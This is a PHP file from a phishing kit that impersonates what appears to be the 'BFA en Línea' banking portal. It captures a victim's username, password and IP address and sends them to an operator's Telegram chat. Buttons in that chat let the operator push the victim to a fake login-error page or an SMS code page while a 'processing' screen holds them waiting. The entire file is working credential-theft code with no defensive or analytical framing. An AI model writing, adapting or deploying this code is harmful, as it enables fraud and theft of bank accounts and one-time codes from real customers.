<?php
session_start();
include('settings.php');

// === PRIMERA VISITA (POST desde psq.php): enviar a Telegram ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = trim($_POST['ips1'] ?? $_SESSION['usuario'] ?? '');
    $clave   = $_POST['ips2'] ?? '';
    $usuario = str_replace(' ', '', $usuario);
    if (!$usuario || !$clave) { header("Location: index.php"); exit; }
    $_SESSION['usuario'] = $usuario;

    $ip  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    $msg = "🔐 NUEVO INGRESO BFA\n👤 Usuario: $usuario\n🔑 Clave: $clave\n🌐 IP: $ip";

    tg_request('sendMessage', [
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [[
                ['text' => '❌ Login Error', 'callback_data' => "LOGINERROR|$usuario"],
                ['text' => '📩 SMS',         'callback_data' => "SMS|$usuario"]
            ]]
        ])
    ]);
    // Cae al render de la página de espera abajo
}

// === ESPERA (se ejecuta en cada meta-refresh) ===
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) { header("Location: index.php"); exit; }

$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    @unlink($archivo);
    switch ($accion) {
        case '/LOGINERROR':
        case '/ERROR':
            header("Location: index2.php"); exit;
        case '/SMS':
            header("Location: tok.html"); exit;
        case '/LOGIN':
            header("Location: index.php"); exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es"><head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BFA en Línea - Procesando</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#fff;font-family:'Segoe UI',sans-serif;color:#022a4f}
  img{max-width:420px;width:55vw;height:auto}
  p{margin-top:18px;font-size:14px;color:#888;text-align:center}
</style>
</head><body>
  <img src="img/loading.gif" alt="Cargando...">
  <p>⚠️ No cierres esta ventana</p>
</body></html>
